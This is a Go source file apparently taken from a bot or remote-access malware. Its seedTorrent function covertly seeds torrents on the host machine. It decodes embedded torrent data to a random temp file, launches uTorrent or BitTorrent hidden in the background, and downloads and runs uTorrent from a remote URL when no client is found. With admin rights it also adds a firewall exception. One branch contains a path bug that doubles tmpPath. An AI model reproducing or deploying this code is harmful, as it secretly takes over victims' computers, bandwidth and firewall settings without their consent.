// Package components Torrent functions
// https://forum.utorrent.com/topic/46012-utorrent-command-line-options/
package components

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

func seedTorrent(torrentData string) {
	if checkFileExist(tmpPath + "uTorrent\\uTorrent.exe") {
		n := randomString(5, false)
		nTorrent, _ := os.Create(tmpPath + n + ".torrent")
		nTorrent.WriteString(base64Decode(torrentData))
		nTorrent.Close()

		Command := string(tmpPath + "uTorrent\\uTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
		//run("start " + tmpPath + "uTorrent\\uTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
	} else if checkFileExist(tmpPath + "BitTorrent\\BitTorrent.exe") {
		n := randomString(5, false)
		nTorrent, _ := os.Create(tmpPath + n + ".torrent")
		nTorrent.WriteString(base64Decode(torrentData))
		nTorrent.Close()
		Command := string(tmpPath + tmpPath + "BitTorrent\\BitTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
		//run("start " + tmpPath + "BitTorrent\\BitTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
	} else if checkFileExist(tmpPath + "uTorrent.exe") {
		n := randomString(5, false)
		nTorrent, _ := os.Create(tmpPath + n + ".torrent")
		nTorrent.WriteString(base64Decode(torrentData))
		nTorrent.Close()
		Command := string(tmpPath + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
		//run("start " + tmpPath + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
	} else { //Download uTorrent
		output, _ := os.Create(tmpPath + "uTorrent.exe")
		defer output.Close()
		response, err := http.Get(uTorrnetURL)
		if err != nil {
			return
		}
		defer response.Body.Close()
		_, _ = io.Copy(output, response.Body)
		if isAdmin {
			addtoFirewall("uTorrent", tmpPath+"uTorrent.exe")
		}
		n := randomString(5, false)
		nTorrent, _ := os.Create(tmpPath + n + ".torrent")
		nTorrent.WriteString(base64Decode(torrentData))
		nTorrent.Close()
		Command := string(tmpPath + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Start()
		//run("start " + tmpPath + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpPath + n + ".torrent")
	}
}
